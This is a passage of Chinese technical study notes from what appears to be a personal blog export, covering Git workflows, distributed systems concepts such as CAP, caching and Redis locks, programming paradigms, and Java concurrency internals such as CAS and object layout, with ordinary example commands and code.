<li>(3.14 - 2) &#x2F; (4 - 2) &#x3D; 0.57， 而 0.57∗223&#x3D;4781506.56，四舍五入，得到 M &#x3D; 4781507。因为有四舍五入，所以，产生了浮点数据的精度问题。</li>
</ul>
<p>回算：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/23/think-more/reverse3.14.png"
                      class="" title="reverse3.14"
                >

<p>整个代码是，之前生成的整数操作产生首次近似值后，将首次近似值作为参数送入函数最后两句进行精化处理。<br>代码中的两次迭代正是为了进一步提高结果的精度。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/23/think-more/newton.png"
                      class="" title="newton"
                >

<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>git add -p可以让你挑选改动提交</p>
<p>git grep $regexp $(git rev-list –all)可以用来在所有的提交中找代码</p>
<h3 id="常见协同流"><a href="#常见协同流" class="headerlink" title="常见协同流"></a>常见协同流</h3><h4 id="Git-flow-工作流（产品现在使用的工作流）"><a href="#Git-flow-工作流（产品现在使用的工作流）" class="headerlink" title="Git flow 工作流（产品现在使用的工作流）"></a>Git flow 工作流（产品现在使用的工作流）</h4><ol>
<li><p>合并分支巨多</p>
<ul>
<li><p>产生了恶心的 merge 节点，使得 git log 看起来十分混乱</p>
<p>  建议：只有 feature 合并到 developer 分支时，使用–no-ff 参数，其他的合并都不使用–no-ff参数来做合并。</p>
</li>
<li><p>分支多可能忘了切</p>
<p>  看起来是个人问题，其实在这种模式下真的很常见，好的模式应该使得用户在无意中做出正确的操作，使看起来一切都是自然而然的</p>
</li>
</ul>
</li>
<li><p>dev-latest 和 master 大多数的情况下相似，但为此付出的额外维护成本并不低</p>
</li>
<li><p>不好回滚，revert 基本不能用</p>
</li>
</ol>
<p><a class="link"   href="https://www.endoflineblog.com/gitflow-considered-harmful" >https://www.endoflineblog.com/gitflow-considered-harmful<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="http://luci.criosweb.ro/a-real-life-git-workflow-why-git-flow-does-not-work-for-us/" >http://luci.criosweb.ro/a-real-life-git-workflow-why-git-flow-does-not-work-for-us/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="GitHub-Flow"><a href="#GitHub-Flow" class="headerlink" title="GitHub Flow"></a>GitHub Flow</h4><p>环境概念应用的不是很好，但是基本是参与开源的标配了</p>
<h4 id="GitLab-Flow"><a href="#GitLab-Flow" class="headerlink" title="GitLab Flow"></a>GitLab Flow</h4><p><a class="link"   href="https://about.gitlab.com/blog/2014/09/29/gitlab-flow/" >https://about.gitlab.com/blog/2014/09/29/gitlab-flow/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><blockquote>
<p>协同工作流的本质，并不是怎么玩好代码仓库的分支策略，而是玩好我们的软件架构和软件开发流程</p>
</blockquote>
<p>疑惑点：现有的 CI&#x2F;CD 只是针对发版使用，不清楚在处理分支上能否有所应用</p>
<h4 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h4><p><a class="link"   href="https://gist.github.com/djspiewak/9f2f91085607a4859a66" >https://gist.github.com/djspiewak/9f2f91085607a4859a66<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="小憩"><a href="#小憩" class="headerlink" title="小憩"></a>小憩</h4><blockquote>
<p>说下为什么API都返回200，在Body里写错误信息：因为有的运营商会拦截非200请求，然后返回广告<br>200 是为了seo,如果搜索引擎发现异常状态码，会对你网站进行十分明显的排名降级</p>
</blockquote>
<p><a class="link"   href="https://coolshell.cn/articles/17459.html" >https://coolshell.cn/articles/17459.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>CAP 定理表明，在存在网络分区的情况下，一致性和可用性必须二选一。而在没有发生网络故障时，即分布式系统正常运行时，一致性和可用性是可以同时被满足的</p>
<ul>
<li><p>CA (consistency + availability)，这样的系统关注一致性和可用性，它需要非常严格的全体一致的协议，比如“两阶段提交”（2PC）。CA 系统不能容忍网络错误或节点错误，一旦出现这样的问题，整个系统就会拒绝写请求，因为它并不知道对面的那个结点是否挂掉了，还是只是网络问题。唯一安全的做法就是把自己变成只读的。</p>
</li>
<li><p>CP (consistency + partition tolerance)，这样的系统关注一致性和分区容忍性。它关注的是系统里大多数人的一致性协议，比如：Paxos 算法（Quorum 类的算法）。这样的系统只需要保证大多数结点数据一致，而少数的结点会在没有同步到最新版本的数据时变成不可用的状态。这样能够提供一部分的可用性。</p>
</li>
<li><p>AP (availability + partition tolerance)，这样的系统关心可用性和分区容忍性。因此，这样的系统不能达成一致性，需要给出数据冲突，给出数据冲突就需要维护数据版本。Dynamo 就是这样的系统。</p>
</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/23/think-more/cap.png"
                      class="" title="CAP"
                >

<p><a class="link"   href="https://time.geekbang.org/column/article/2080" >https://time.geekbang.org/column/article/2080<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://time.geekbang.org/column/article/2421" >https://time.geekbang.org/column/article/2421<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="全栈监控"><a href="#全栈监控" class="headerlink" title="全栈监控"></a>全栈监控</h3><p>APM 监控，字节码插桩，无侵入实现</p>
<p>ELK， <strong><a class="link"   href="https://research.google.com/pubs/pub36356.html" >ZIPKIN<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></p>
<ul>
<li><p>容量管理。提供一个全局的系统运行时数据的展示，可以让工程师团队知道是否需要增加机器或者其它资源。</p>
</li>
<li><p>性能管理。可以通过查看大盘，找到系统瓶颈，并有针对性地优化系统和相应代码。</p>
</li>
<li><p>“急诊”定位问题。可以快速地暴露并找到问题的发生点，帮助技术人员诊断问题。</p>
</li>
<li><p>性能分析。当出现非预期的流量提升时，可以快速地找到系统的瓶颈，并帮助开发人员深入代码。</p>
</li>
</ul>
<h3 id="服务调度"><a href="#服务调度" class="headerlink" title="服务调度"></a>服务调度</h3><blockquote>
<p>微服务是服务依赖最优解的上限，而服务依赖的下限是千万不要有依赖环。</p>
</blockquote>
<p><a class="link"   href="https://time.geekbang.org/column/article/1604" >https://time.geekbang.org/column/article/1604<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="流量与数据调度"><a href="#流量与数据调度" class="headerlink" title="流量与数据调度"></a>流量与数据调度</h3><h4 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h4><ol>
<li>服务流控。服务发现、服务路由、服务降级、服务熔断、服务保护等。</li>
<li>流量控制。负载均衡、流量分配、流量控制、异地灾备（多活）等。</li>
<li>流量管理。协议转换、请求校验、数据缓存、数据计算等。</li>
</ol>
<h4 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h4><p><a class="link"   href="https://megaease.com/zh/" >https://megaease.com/zh/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<ul>
<li>高性能。API Gateway 必须使用高性能的技术，所以，也就需要使用高性能的语言。</li>
<li>扛流量。要能扛流量，就需要使用集群技术。集群技术的关键点是在集群内的各个结点中共享数据。这就需要使用像 Paxos、Raft、Gossip 这样的通讯协议。因为 Gateway 需要部署在广域网上，所以还需要集群的分组技术。</li>
<li>业务逻辑。API Gateway 需要有简单的业务逻辑，所以，最好是像 AWS 的 Lambda 服务一样，可以让人注入不同语言的简单业务逻辑。</li>
<li>服务化。一个好的 API Gateway 需要能够通过 Admin API 来不停机地管理配置变更，而不是通过一个.conf 文件来人肉地修改配置。</li>
</ul>
<h4 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h4><blockquote>
<p>态数据调度应该是在 IaaS 层的数据存储解决的问题，而不是在 PaaS 层或者 SaaS 层来解决的。</p>
</blockquote>
<ol>
<li>对于应用层上的分布式事务一致性，只有两阶段提交这样的方式。</li>
<li>而底层存储可以解决这个问题的方式是通过一些像 Paxos、Raft 或是 NWR 这样的算法和模型来解决。</li>
<li>状态数据调度应该是由分布式存储系统来解决的，这样会更为完美。但是因为数据存储的 Scheme 太多，所以，导致我们有各式各样的分布式存储系统，有文件对象的，有关系型数据库的，有 NoSQL 的，有时序数据的，有搜索数据的，有队列的……</li>
</ol>
<h2 id="编程范式"><a href="#编程范式" class="headerlink" title="编程范式"></a>编程范式</h2><h3 id="泛型编程"><a href="#泛型编程" class="headerlink" title="泛型编程"></a>泛型编程</h3><ol>
<li>C 只能通过 <code>void*</code> 或者 宏替换 的形式来对数据类型适配。</li>
<li>C 泛型需要引入额外的 size，这意味着要把泛型算法的信任交付给程序员。</li>
<li>C 强大之处在于 使用 C 语言的程序员在高级语言的特性之上还能简单地做任何底层上的微观控制</li>
</ol>
<p><a class="link"   href="https://time.geekbang.org/column/article/2017" >https://time.geekbang.org/column/article/2017<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="函数式"><a href="#函数式" class="headerlink" title="函数式"></a>函数式</h3><blockquote>
<p>参考 sicp <a class="link"   href="https://time.geekbang.org/column/article/2711" >https://time.geekbang.org/column/article/2711<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<ol>
<li><p>惰性求值</p>
</li>
<li><p>确定性</p>
</li>
</ol>
<h4 id="惯用技术"><a href="#惯用技术" class="headerlink" title="惯用技术"></a>惯用技术</h4><ul>
<li>first class function（头等函数） ：这个技术可以让你的函数就像变量一样来使用。也就是说，你的函数可以像变量一样被创建、修改，并当成变量一样传递、返回，或是在函数中嵌套函数。</li>
<li>tail recursion optimization（尾递归优化） ： 我们知道递归的害处，那就是如果递归很深的话，stack 受不了，并会导致性能大幅度下降。因此，我们使用尾递归优化技术——每次递归时都会重用 stack，这样能够提升性能。当然，这需要语言或编译器的支持。Python 就不支持。</li>
<li>map &amp; reduce ：这个技术不用多说了，函数式编程最常见的技术就是对一个集合做 Map 和 Reduce 操作。这比起过程式的语言来说，在代码上要更容易阅读。（传统过程式的语言需要使用 for&#x2F;while 循环，然后在各种变量中把数据倒过来倒过去的）这个很像 C++ STL 中 foreach、find_if、count_if 等函数的玩法。</li>
<li>pipeline（管道）：这个技术的意思是，将函数实例成一个一个的 action，然后将一组 action 放到一个数组或是列表中，再把数据传给这个 action list，数据就像一个 pipeline 一样顺序地被各个函数所操作，最终得到我们想要的结果。</li>
<li>recursing（递归） ：递归最大的好处就简化代码，它可以把一个复杂的问题用很简单的代码描述出来。注意：递归的精髓是描述问题，而这正是函数式编程的精髓。</li>
<li>currying（柯里化） ：将一个函数的多个参数分解成多个函数， 然后将函数多层封装起来，每层函数都返回一个函数去接收下一个参数，这可以简化函数的多个参数。在 C++ 中，这很像 STL 中的 bind1st 或是 bind2nd。</li>
<li>higher order function（高阶函数）：所谓高阶函数就是函数当参数，把传入的函数做一个封装，然后返回这个封装函数。现象上就是函数传进传出，就像面向对象对象满天飞一样。这个技术用来做 Decorator 很不错。</li>
</ul>
<h3 id="修饰器"><a href="#修饰器" class="headerlink" title="修饰器"></a>修饰器</h3><p><a class="link"   href="https://time.geekbang.org/column/article/2723" >https://time.geekbang.org/column/article/2723<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="OOP"><a href="#OOP" class="headerlink" title="OOP"></a>OOP</h3><p><a class="link"   href="https://time.geekbang.org/column/article/2729" >https://time.geekbang.org/column/article/2729<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="基于原型"><a href="#基于原型" class="headerlink" title="基于原型"></a>基于原型</h3><p><a class="link"   href="https://time.geekbang.org/column/article/2741" >https://time.geekbang.org/column/article/2741<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Go-的委托模式"><a href="#Go-的委托模式" class="headerlink" title="Go 的委托模式"></a>Go 的委托模式</h3><p><a class="link"   href="https://time.geekbang.org/column/article/2748" >https://time.geekbang.org/column/article/2748<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><a class="link"   href="https://time.geekbang.org/column/article/2751" >https://time.geekbang.org/column/article/2751<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://time.geekbang.org/column/article/2752" >https://time.geekbang.org/column/article/2752<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://time.geekbang.org/column/article/2754" >https://time.geekbang.org/column/article/2754<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="弹力设计"><a href="#弹力设计" class="headerlink" title="弹力设计"></a>弹力设计</h2><h3 id="隔离设计-Bulkheads"><a href="#隔离设计-Bulkheads" class="headerlink" title="隔离设计 Bulkheads"></a>隔离设计 Bulkheads</h3><p><a class="link"   href="https://time.geekbang.org/column/article/3917" >https://time.geekbang.org/column/article/3917<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="异步通讯"><a href="#异步通讯" class="headerlink" title="异步通讯"></a>异步通讯</h3><p><a class="link"   href="https://time.geekbang.org/column/article/3926" >https://time.geekbang.org/column/article/3926<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="幂等性"><a href="#幂等性" class="headerlink" title="幂等性"></a>幂等性</h3><h3 id="服务状态"><a href="#服务状态" class="headerlink" title="服务状态"></a>服务状态</h3><h3 id="补偿事务"><a href="#补偿事务" class="headerlink" title="补偿事务"></a>补偿事务</h3><h3 id="重试设计"><a href="#重试设计" class="headerlink" title="重试设计"></a>重试设计</h3><h3 id="熔断设计"><a href="#熔断设计" class="headerlink" title="熔断设计"></a>熔断设计</h3><h3 id="限流设计"><a href="#限流设计" class="headerlink" title="限流设计"></a>限流设计</h3><h3 id="降级设计"><a href="#降级设计" class="headerlink" title="降级设计"></a>降级设计</h3><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><h2 id="管理设计"><a href="#管理设计" class="headerlink" title="管理设计"></a>管理设计</h2><h3 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET resource_name my_random_value NX PX 30000</span><br><span class="line"></span><br><span class="line">SET NX 命令只会在 key 不存在的时候给 key 赋值，PX 命令通知 Redis 保存这个 key 30000ms。</span><br><span class="line">my_random_value 必须是全局唯一的值。这个随机数在释放锁时保证释放锁操作的安全性。</span><br><span class="line">PX 操作后面的参数代表的是这个 key 的存活时间，称作锁过期时间。</span><br><span class="line">当资源被锁定超过这个时间时，锁将自动释放。</span><br><span class="line">获得锁的客户端如果没有在这个时间窗口内完成操作，就可能会有其他客户端获得锁，引起争用问题。</span><br></pre></td></tr></table></figure></div>

<h3 id="配置中心"><a href="#配置中心" class="headerlink" title="配置中心"></a>配置中心</h3><p><a class="link"   href="https://time.geekbang.org/column/article/5819" >https://time.geekbang.org/column/article/5819<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="边车模式"><a href="#边车模式" class="headerlink" title="边车模式"></a>边车模式</h3><p><a class="link"   href="https://time.geekbang.org/column/article/5909" >https://time.geekbang.org/column/article/5909<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="服务网格"><a href="#服务网格" class="headerlink" title="服务网格"></a>服务网格</h3><p><a class="link"   href="https://time.geekbang.org/column/article/5920" >https://time.geekbang.org/column/article/5920<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h3><p><a class="link"   href="https://time.geekbang.org/column/article/6086" >https://time.geekbang.org/column/article/6086<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="部署升级策略"><a href="#部署升级策略" class="headerlink" title="部署升级策略"></a>部署升级策略</h3><p><a class="link"   href="https://time.geekbang.org/column/article/6283" >https://time.geekbang.org/column/article/6283<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="性能设计"><a href="#性能设计" class="headerlink" title="性能设计"></a>性能设计</h2><h3 id="Cache-内存和-IO-密集型的应用"><a href="#Cache-内存和-IO-密集型的应用" class="headerlink" title="Cache 内存和 IO 密集型的应用"></a>Cache 内存和 IO 密集型的应用</h3><h4 id="cache-aside-pattern"><a href="#cache-aside-pattern" class="headerlink" title="cache aside pattern"></a>cache aside pattern</h4><p>所以，这也就是 <a class="link"   href="https://www.quora.com/Why-does-Facebook-use-delete-to-remove-the-key-value-pair-in-Memcached-instead-of-updating-the-Memcached-during-write-request-to-the-backend" >Quora<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 上的那个答案里说的，要么通过 2PC 或是 Paxos 协议保证一致性，要么就是拼命地降低并发时脏数据的概率。而 Facebook 使用了这个降低概率的玩法，因为 2PC 太慢，而 Paxos 太复杂。当然，最好还是为缓存设置好过期时间</p>
<h4 id="Read-x2F-Write-Through-更新模式"><a href="#Read-x2F-Write-Through-更新模式" class="headerlink" title="Read&#x2F;Write Through 更新模式"></a>Read&#x2F;Write Through 更新模式</h4><ol>
<li><p>Cache Aside 是由调用方负责把数据加载入缓存，而 Read Through 则用缓存服务自己来加载，从而对应用方是透明的</p>
</li>
<li><p>当有数据更新的时候，如果没有命中缓存，直接更新数据库，然后返回。如果命中了缓存，则更新缓存，然后由 Cache 自己更新数据库（这是一个同步操作）。</p>
</li>
</ol>
<h4 id="Write-Behind-Caching-更新模式"><a href="#Write-Behind-Caching-更新模式" class="headerlink" title="Write Behind Caching 更新模式"></a>Write Behind Caching 更新模式</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/23/think-more/wbc.png"
                      class="" title="wbc"
                >


<h3 id="异步处理-1"><a href="#异步处理-1" class="headerlink" title="异步处理"></a>异步处理</h3><p><a class="link"   href="https://time.geekbang.org/column/article/7036" >https://time.geekbang.org/column/article/7036<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="数据库扩展"><a href="#数据库扩展" class="headerlink" title="数据库扩展"></a>数据库扩展</h3><p>业务层上，只有两阶段提交，数据层上，只有Paxos</p>
<p><a class="link"   href="https://time.geekbang.org/column/article/7045" >https://time.geekbang.org/column/article/7045<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="秒杀"><a href="#秒杀" class="headerlink" title="秒杀"></a>秒杀</h3><p><a class="link"   href="https://time.geekbang.org/column/article/7047" >https://time.geekbang.org/column/article/7047<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="边缘计算"><a href="#边缘计算" class="headerlink" title="边缘计算"></a>边缘计算</h3><p><a class="link"   href="https://time.geekbang.org/column/article/7086" >https://time.geekbang.org/column/article/7086<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="练级"><a href="#练级" class="headerlink" title="练级"></a>练级</h2><h3 id="入门篇"><a href="#入门篇" class="headerlink" title="入门篇"></a>入门篇</h3><h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><ul>
<li><a class="link"   href="https://www.cnblogs.com/kevinyang/archive/2010/06/18/1760597.html" >https://www.cnblogs.com/kevinyang/archive/2010/06/18/1760597.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://en.wikipedia.org/wiki/Character_encoding" >https://en.wikipedia.org/wiki/Character_encoding<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<h4 id="Git-1"><a href="#Git-1" class="headerlink" title="Git"></a>Git</h4><p><a class="link"   href="https://www.runoob.com/git/git-workspace-index-repo.html" >https://www.runoob.com/git/git-workspace-index-repo.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/23/think-more/git-status.png"
                      class="" title="git-status"
                >

<p><a class="link"   href="https://github.com/git/git/blob/master/Documentation/CodingGuidelines" >https://github.com/git/git/blob/master/Documentation/CodingGuidelines<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="编程规范"><a href="#编程规范" class="headerlink" title="编程规范"></a>编程规范</h4><p><a class="link"   href="https://google.github.io/styleguide/javaguide.html" >https://google.github.io/styleguide/javaguide.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="理论学科"><a href="#理论学科" class="headerlink" title="理论学科"></a>理论学科</h3><h4 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h4><p><a class="link"   href="https://www.wikiwand.com/en/List_of_algorithms" >算法列表<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.cs.usfca.edu/~galles/visualization/Algorithms.html" >算法可视化<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="系统知识"><a href="#系统知识" class="headerlink" title="系统知识"></a>系统知识</h3><p><a class="link"   href="https://time.geekbang.org/column/article/8888" >https://time.geekbang.org/column/article/8888<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="TCP-x2F-IP"><a href="#TCP-x2F-IP" class="headerlink" title="TCP&#x2F;IP"></a>TCP&#x2F;IP</h4><p><a class="link"   href="http://www.tcpipguide.com/index.htm" >http://www.tcpipguide.com/index.htm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/" >http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>Program</tag>
        <tag>Idea</tag>
      </tags>
  </entry>
  <entry>
    <title>Thread</title>
    <url>/2020/09/19/thread/</url>
    <content><![CDATA[<h4 id="线程生命周期"><a href="#线程生命周期" class="headerlink" title="线程生命周期"></a>线程生命周期</h4><h4 id="happens-before"><a href="#happens-before" class="headerlink" title="happens-before"></a>happens-before</h4><ol>
<li>程序顺序规则：一个线程中的每一个操作，happens-before于该线程中的任意后续操作。</li>
<li>监视器锁规则：对一个锁的解锁，happens-before于随后对这个锁的加锁。</li>
<li>volatile变量规则：对一个volatile域的写，happens-before于任意后续对这个volatile域的读。</li>
<li>传递性：如果A happens-before B，且B happens-before C，那么A happens-before C。</li>
<li>start规则：如果线程A执行操作ThreadB.start()启动线程B，那么A线程的ThreadB.start（）操作happens-before于线程B中的任意操作、</li>
<li>join规则：如果线程A执行操作ThreadB.join（）并成功返回，那么线程B中的任意操作happens-before于线程A从ThreadB.join()操作成功返回。</li>
</ol>
<h4 id="内存屏障"><a href="#内存屏障" class="headerlink" title="内存屏障"></a>内存屏障</h4><ol>
<li><p>如果第一个操作是volatile读，那无论第二个操作是什么，都不能重排序；</p>
</li>
<li><p>如果第二个操作是volatile写，那无论第一个操作是什么，都不能重排序；</p>
</li>
<li><p>如果第一个操作是volatile写，第二个操作是volatile读，那不能重排序。</p>
</li>
</ol>
<h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h1><h2 id="原子类"><a href="#原子类" class="headerlink" title="原子类"></a>原子类</h2><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">            var5 = <span class="built_in">this</span>.getIntVolatile(var1, var2);</span><br><span class="line">&#125; <span class="keyword">while</span>(!<span class="built_in">this</span>.compareAndSwapInt(var1, var2, var5, var5 + var4));</span><br></pre></td></tr></table></figure></div>

<p><code>c++</code> 实现 <code>native method: compareAndSwapInt</code></p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">UNSAFE_ENTRY</span>(jboolean, <span class="built_in">Unsafe_CompareAndSwapInt</span>(JNIEnv *env, jobject unsafe, jobject obj, jlong offset, jint e, jint x))</span><br><span class="line">  <span class="built_in">UnsafeWrapper</span>(<span class="string">&quot;Unsafe_CompareAndSwapInt&quot;</span>);</span><br><span class="line">  oop p = JNIHandles::<span class="built_in">resolve</span>(obj);</span><br><span class="line">  jint* addr = (jint *) <span class="built_in">index_oop_from_field_offset_long</span>(p, offset);</span><br><span class="line">  <span class="keyword">return</span> (jint)(Atomic::<span class="built_in">cmpxchg</span>(x, addr, e)) == e;</span><br><span class="line"><span class="function">UNSAFE_END</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> jint     <span class="title">Atomic::cmpxchg</span>    <span class="params">(jint     exchange_value, <span class="keyword">volatile</span> jint*     dest, jint     compare_value)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> mp = os::<span class="built_in">is_MP</span>();</span><br><span class="line">  <span class="function">__asm__ <span class="title">volatile</span> <span class="params">(LOCK_IF_MP(%<span class="number">4</span>) <span class="string">&quot;cmpxchgl %1,(%3)&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">                    : <span class="string">&quot;=a&quot;</span> (exchange_value)</span></span></span><br><span class="line"><span class="params"><span class="function">                    : <span class="string">&quot;r&quot;</span> (exchange_value), <span class="string">&quot;a&quot;</span> (compare_value), <span class="string">&quot;r&quot;</span> (dest), <span class="string">&quot;r&quot;</span> (mp)</span></span></span><br><span class="line"><span class="params"><span class="function">                    : <span class="string">&quot;cc&quot;</span>, <span class="string">&quot;memory&quot;</span>)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> exchange_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>LOCK_IF_MP</code> multi processor  </p>
<p><code>cmpxchg</code> 不具有原子性，原子性 是通过加lock来保障</p>
<p><code>lock cmxchg</code> 指令，lock保证 <code>cmpchg</code>操作某块内存时不允许其他 <code>cpu</code> 对该块做出修改</p>
<p>tips： lock在执行后面指令时锁定一个北桥信号而不采用锁总线的方式</p>
<h2 id="JOL-java-object-layout"><a href="#JOL-java-object-layout" class="headerlink" title="JOL java object layout"></a>JOL java object layout</h2><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(ClassLayout.parseInstance(o).toPrintable());</span><br></pre></td></tr></table></figure></div>

<p><code>markword</code>  8个字节, <code>class pointer</code> 4个字节, <code>instance data</code>, <code>padding</code></p>
<p>指针长度 默认取决你的JVM，比如 64 bit, 即8个字节</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">java -XX:+PrintCommandLineFlags -version</span><br><span class="line">-XX:InitialHeapSize=267602688 -XX:MaxHeapSize=4281643008 -XX:+PrintCommandLineFlags -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:-UseLargePagesIndividualAllocation -XX:+UseParallelGC</span><br><span class="line">java version <span class="string">&quot;1.8.0_231&quot;</span></span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_231-b11)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.231-b11, mixed mode)</span><br></pre></td></tr></table></figure></div>

<p>但是由于开启了 <code>UseCompressed*</code>, 会被压缩为4个字节</p>
<p> 而 <code>Oop</code> 指的是 <code>ordinary object pointer</code>，  指成员变量</p>
<p><code>markword</code> 记录的信息</p>
<p>tips： 轻量级锁， 自旋锁， 无锁【傻逼叫法】 指的是同一种锁，只不过是各种花哨叫法</p>
